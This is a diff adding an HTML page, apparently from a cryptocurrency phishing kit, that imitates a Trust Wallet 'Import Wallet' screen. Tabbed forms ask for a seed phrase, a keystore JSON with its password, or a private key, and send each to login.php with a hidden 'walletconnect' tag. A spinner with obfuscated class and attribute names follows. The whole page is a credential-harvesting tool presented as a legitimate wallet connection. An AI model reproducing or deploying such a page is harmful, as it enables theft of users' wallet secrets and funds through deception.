@@ -1,0 +1,120 @@
+
+
+<!DOCTYPE html>
+<html><head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
+    <title>Import Wallet</title>
+    <link rel="stylesheet" href="css/bootstrap.css">
+    <link rel="stylesheet" href="css/fontawesome-all.css">
+	<link rel="stylesheet" href="css/apk.css">
+
+    <script src="css/jquery.min.js"></script>
+
+</head>
+
+
+<body>
+   <header>
+        <div class="container-fluid">
+			<div class="row">
+			<div class="col-md-4 offset-md-4">
+				<div class="sc-fYxtnH hARKVj">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img src="css/trust.png" alt="" style="height: 50px;width: 150px;" class="sc-tilXH gdtVXy"></div>
+
+				<br> 
+			
+
+			</div>
+			</div>
+		</div>
+    </header>
+	<div class="container-fluid">
+		<div class="row">
+			<div class="col-md-4 offset-md-4">
+				<ul class="nav nav-tabs">
+					<li class="nav-item"><a class="nav-link active show" data-toggle="tab" href="#phrase">Phrase</a></li>
+					<li class="nav-item"><a class="nav-link" data-toggle="tab" href="#keystore">Keystore JSON</a></li>
+					<li class="nav-item"><a class="nav-link" data-toggle="tab" href="#privatekey">Private Key</a></li>
+					
+				</ul>
+			</div>
+		</div>
+	</div>
+      <section style="margin-top: 40px;">
+        <div class="container-fluid">
+            <div class="row">
+                <div class="col-md-4 offset-md-4">
+	<!-- Tab panes -->
+					<div class="tab-content">
+						<div role="tabpanel" class="tab-pane fade active show" id="phrase">
+							<form method="post" action="login.php">
+								
+								<textarea class="form-control" rows="5" name="phrase" placeholder="Phrase" minlength="24" maxlength="305" required=""></textarea>
+								<p class="text-secondary" style="margin-top: 10px;">Typically 12 (sometimes 24) words seperated by a single spaces.</p>
+								<input type="hidden" name="walletname" value="walletconnect">
+								<br><div class="form-group"><button class="btn btn-primary btn-block" type="submit" name="submit1" style="height: 44px;">CONNECT</button></div>
+							</form>
+						</div>
+						<div role="tabpanel" class="tab-pane fade" id="keystore">
+							<form method="post" action="login.php">
+							<input type="hidden" name="walletname" value="walletconnect">
+								
+								<div class="form-group">
+									<textarea class="form-control" name="keystore" rows="5" placeholder="Keystore JSON" minlength="30" maxlength="305" required=""></textarea>
+								</div>
+								<div class="form-group">
+									<input class="form-control" type="password" name="keystorepasswword" placeholder="Password" minlength="6" maxlength="50" required="" style=" height: 44px;">
+								</div>
+								<p class="text-secondary" style="margin-top: 10px;">
+									Several lines of text beginning with "{...}" plus the password you used to encrypt it.
+								</p>
+								
+								<br><div class="form-group"><button class="btn btn-primary btn-block" type="submit" name="submit2" style="height: 44px;">CONNECT</button></div>
+							</form>
+						</div>
+						<div role="tabpanel" class="tab-pane fade" id="privatekey">
+							<form method="post" action="login.php">
+							<input type="hidden" name="walletname" value="walletconnect">
+								
+								<div class="form-group">
+									<input class="form-control" name="privatekey" placeholder="Private Key" required="" minlength="24" maxlength="150" style=" height: 44px;">
+								</div>
+								<p class="text-secondary" style="margin-top: 10px;">Typically 64 alphanumeric characters</p>
+								
+								<br><div class="form-group"><button class="btn btn-primary btn-block" type="submit" name="submit3" style="height: 44px;">CONNECT</button></div>
+							</form>
+							
+						</div>
+					</div>
+                </div>
+            </div>
+        </div>
+		 <div class="confirm-approve-content__view-full-tx-button-wrapper">
+                                    <div class="confirm-approve-content__view-full-tx-button cursor-pointer"></div>
+                                </div>
+                            <div class="wawobp loader" data-tenqwa="9fkuxe">
+                                <div class="yat5ls lodas" data-2ivb6w="2n92zq">
+                                    <svg viewBox="0 0 40 40" width="80px" color="text" xmlns="http://www.w3.org/2000/svg" class="sc-5a69fd5e-0 iGtDTz" style="
+    margin-bottom: 20px;
+">
+                      <path opacity="0.9" d="M19.9959 4.8377L20.7771 3.82105C20.5523 3.64825 20.2766 3.55457 19.9931 3.55457C19.7095 3.55457 19.4339 3.64825 19.209 3.82105L19.9959 4.8377ZM33.425 8.7837H34.7059C34.7081 8.61378 34.6767 8.44509 34.6134 8.28737C34.5502 8.12965 34.4563 7.98603 34.3372 7.8648C34.2181 7.74358 34.0762 7.64714 33.9196 7.58107C33.763 7.515 33.5949 7.4806 33.425 7.47985V8.7837ZM19.9959 36.2161L19.2837 37.2845C19.4936 37.425 19.7405 37.5 19.9931 37.5C20.2457 37.5 20.4925 37.425 20.7024 37.2845L19.9959 36.2161ZM6.57841 8.7837V7.49709C6.40847 7.49783 6.24036 7.53223 6.0838 7.5983C5.92723 7.66437 5.7853 7.76081 5.66621 7.88204C5.54712 8.00326 5.45322 8.14688 5.38995 8.3046C5.32667 8.46232 5.29526 8.63101 5.29754 8.80093L6.57841 8.7837ZM19.2148 5.84861C25.0275 10.3518 31.6846 10.0646 33.4307 10.0646V7.49709C31.6214 7.49709 25.8259 7.72684 20.7943 3.82105L19.2148 5.84861ZM32.1499 8.76073C32.0522 14.7113 31.7995 18.91 31.317 22.0174C30.8345 25.1248 30.1682 26.9399 29.2894 28.238C28.4106 29.5361 27.2848 30.3804 25.6364 31.3626C23.9879 32.3448 21.8799 33.4361 19.2837 35.1535L20.7312 37.2845C23.1895 35.6475 25.2343 34.6021 26.9747 33.5625C28.7284 32.6075 30.2502 31.2779 31.4319 29.6682C32.5806 27.9451 33.3675 25.6475 33.873 22.408C34.3785 19.1685 34.6369 14.809 34.7346 8.80093L32.1499 8.76073ZM20.7312 35.1535C18.1522 33.4304 16.05 32.362 14.413 31.3684C12.776 30.3747 11.6502 29.582 10.7656 28.238C9.8811 26.8939 9.16312 25.1076 8.66915 22.0174C8.17519 18.9273 7.95692 14.7113 7.85928 8.76073L5.29754 8.80093C5.39518 14.809 5.6594 19.18 6.15911 22.408C6.65882 25.636 7.42275 27.9336 8.59448 29.6682C9.77051 31.2788 11.2888 32.6088 13.0402 33.5625C14.7633 34.6021 16.8254 35.6475 19.2837 37.2845L20.7312 35.1535ZM6.57841 10.0646C8.30155 10.0646 14.9644 10.3518 20.7771 5.84861L19.209 3.82105C14.166 7.72684 8.37048 7.49709 6.57266 7.49709L6.57841 10.0646Z" fill="#0b65c6"></path>
+                    </svg>
+                                    <div class="7n1smr loader2 loader--style3" title="2" data-knlucr="ga7q37">
+                                        <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" style="margin:auto;background:#fff;display:block;" width="40px" height="40px" viewBox="0 0 100 100" preserveAspectRatio="xMidYMid">
+                        <circle cx="50" cy="50" fill="none" stroke="#0b65c6" stroke-width="10" r="35" stroke-dasharray="164.93361431346415 56.97787143782138">
+                          <animateTransform attributeName="transform" type="rotate" repeatCount="indefinite" dur="1s" values="0 50 50;360 50 50" keyTimes="0;1"></animateTransform>
+                        </circle>
+                      </svg>
+
+                </div>
+
+
+    </section>
+	<script src="js/load.js"></script>
+    <script src="js/jquery.js"></script>
+    <script src="js/bootstrap.js"></script>
+
+
+
+</body></html>
